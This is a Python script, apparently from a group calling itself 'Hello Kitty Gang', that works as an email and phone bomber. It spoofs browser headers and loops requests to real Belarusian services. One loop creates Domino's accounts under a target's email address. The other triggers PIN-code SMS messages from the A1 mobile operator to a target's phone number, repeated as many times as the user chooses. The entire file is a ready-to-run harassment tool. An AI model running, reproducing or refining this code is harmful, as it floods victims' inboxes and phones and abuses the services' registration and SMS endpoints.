import uuid
import functools
import requests
import asyncio
from termcolor import colored

print(colored("""
    ´´´´´´´¶¶¶¶´´´´´´´´´´´´´´´´´´
´´´´´´¶¶´´´´¶¶¶¶¶´´¶¶¶¶´¶¶¶¶´´
´´´´´´¶´´´´´´´´´´¶¶¶¶´¶¶´´´´¶´
´´´´´´¶´´´´´´´´´´¶´¶¶¶¶¶¶´´´¶´
´´´´´¶´´´´´´´´´´¶¶¶¶¶´´´¶¶¶¶¶´
´´´´¶´´´´´´´´´´´´´´´´¶¶¶¶¶¶¶¶´
´´´¶´´´´´´´´´´´´´´´´´´´¶¶¶¶¶´´
´¶¶¶´´´´´¶´´´´´´´´´´´´´´´´´¶´´
´´´¶´´´´¶¶´´´´´´´´´´´´´´´´´¶´´
´´´¶¶´´´´´´´´´´´´´´´´¶¶´´´´¶´´
´´¶¶¶´´´´´´´´´¶¶¶´´´´¶¶´´´¶¶´´
´´´´´¶¶´´´´´´´´´´´´´´´´´´¶¶¶´´
´´´´´´´¶¶¶´´´´´´´´´´´´´¶¶¶´´´´
´´´¶¶¶¶¶´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´
´´´¶´´´´¶¶¶¶¶´´´´¶¶¶¶´´´¶´´´´´
´´´¶´´´´¶¶¶´¶¶¶¶¶¶¶¶´´´¶¶¶´´´´
´´´¶¶¶¶¶¶¶¶¶¶¶¶¶´´¶¶¶¶¶´´´¶¶´´
´´¶´´´´´´¶¶¶¶¶¶¶¶¶¶¶´´´´´´´¶´´
´¶´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´´¶´´
´´¶´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´´¶´´
´´¶¶´´´´´´´¶¶´´´´¶¶´´´´´´¶¶´´´
´´´´¶¶¶¶¶¶¶´´´´´´´´¶¶¶¶¶¶´´
´´´´´´´HELLO´´KITTY´´GANG´´´
´´´´´´´BY´´´DATA404´´´´´´´
""", "magenta"))

domios_headers = {
    'Connection': 'keep-alive',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
    'sec-ch-ua-mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Content-Type': 'application/json;charset=UTF-8',
    'Accept': 'application/json, text/plain, */*',
    'sec-ch-ua-platform': '"macOS"',
    'Origin': 'https://dominos.by',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://dominos.by/user'
}

a1_headers = {
    'Connection': 'keep-alive',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
    'Accept': 'text/plain, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua-mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'sec-ch-ua-platform': '"macOS"',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://asmp.a1.by/asmp/registration?userRequestURL=https%253A%252F%252Fwww.a1.by%252Fru%252Fcorporate%252Fmobile-and-fixed-lines%252Fservices%252Fbase-services%252Flichnyj-kabinet%252Fp%252Flichnyj-kabinet%253FfromSSO%253Dtrue',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8,ru;q=0.7'
}


def output_status(response, provider):
    if response.status_code == 200:
        print(colored(f"{provider} sent successful", "blue"))
    else:
        print(colored(f"{provider} Failure", "red"))


def update_data(email):
    dominos_data = "{{\"email\":\"{1}\", \"phone\":\"375293345467\",\"password\": \"{0}\"}}".format(
        str(uuid.uuid4()).replace('-', ''), email)
    return dominos_data


def parse_phone_a1(phone):
    phone = phone.replace('+', '')
    phone = phone[0:3] + '+' + phone[3:5] + '+' + phone[5:8] + '+' + phone[8:10] + '+' + phone[10:12]
    phone = f"%2B{phone}"
    return phone


async def email_bomber(email):
    loop = asyncio.get_event_loop()
    print(colored("Started Dominos", "blue"))
    dominos_data = update_data(email)
    feature_dominos = loop.run_in_executor(None, lambda: requests.request('POST',
                                                                          url='https://dominos.by/api/web/user/register?language=ru&cityId=2',
                                                                          headers=domios_headers, data=dominos_data))
    response_dominos = await feature_dominos
    output_status(response_dominos, "Dominos")


async def phone_bomber(phone):
    loop = asyncio.get_event_loop()
    print(colored("Started A1", "blue"))
    if phone[3:5] in ('29', '44'):
        phone = parse_phone_a1(phone)
        feature_a1 = loop.run_in_executor(None, lambda: requests.request("GET",
                                                                         url=f'https://asmp.a1.by/asmp/registration-sendpin?t=r&phone={phone}&timer=180',
                                                                         headers=a1_headers, data={}))
        response_a1 = await feature_a1
        output_status(response_a1, "A1")
    else:
        print(colored("A1 skipped", "blue"))


if __name__ == '__main__':
    option = int(input(colored("Chose desirable option... [1] - Email bomber, [2] - phone bomber \n", "blue")))
    count = int(input(colored("How much iterations u want? ", "blue")))
    if option == 1:
        email = input(colored("Enter target email:", "yellow"))
        loop = asyncio.get_event_loop()
        for i in range(count):
            loop.run_until_complete(email_bomber(email=email.strip()))
    elif option == 2:
        phone = input(colored("Enter target phone in format 375xxxxxxxxx:", "yellow"))
        loop = asyncio.get_event_loop()
        for i in range(count):
            loop.run_until_complete(phone_bomber(phone=phone.strip()))
